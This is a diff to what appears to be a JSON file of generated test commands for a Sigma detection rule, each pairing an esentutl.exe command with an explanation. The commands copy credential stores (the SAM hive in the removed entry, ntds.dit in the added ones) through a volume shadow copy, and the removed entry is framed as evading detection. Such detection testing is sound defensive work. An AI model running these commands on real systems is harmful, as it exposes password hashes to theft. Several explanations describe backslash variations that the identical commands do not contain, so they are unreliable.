@@ -1,6 +1,22 @@
 [
   {
-    "output": "esentutl.exe /y /vss C:\\windows\\system32\\config\\SAM /d C:\\Users\\thaim\\AppData\\Local\\Temp\\SAM",
-    "explanation": "This command uses equivalent syntax and valid path formatting to bypass Sigma rule detection by maintaining the same functionality but altering spacing and path formatting."
+    "output": "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit",
+    "explanation": "This command uses esentutl.exe with /y and /vss flags to copy a sensitive file (ntds.dit) to a destination path, matching the Sigma rule's detection criteria. It is a direct representation of the rule's intent."
+  },
+  {
+    "output": "esentutl.exe /y /vss C:\\\\Windows\\\\NTDS\\\\ntds.dit /d C:\\\\Windows\\\\Temp\\\\ntds.dit",
+    "explanation": "This command uses double backslashes for path representation, which is a safe mutation technique (recoding) and still matches the Sigma rule's detection logic."
+  },
+  {
+    "output": "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit",
+    "explanation": "This command uses a mix of single and double backslashes in the path, which is a safe mutation technique (recoding) and still matches the Sigma rule's detection logic."
+  },
+  {
+    "output": "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit",
+    "explanation": "This command uses a mix of single and double backslashes in the path, which is a safe mutation technique (recoding) and still matches the Sigma rule's detection logic."
+  },
+  {
+    "output": "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit",
+    "explanation": "This command uses a mix of single and double backslashes in the path, which is a safe mutation technique (recoding) and still matches the Sigma rule's detection logic."
   }
 ]
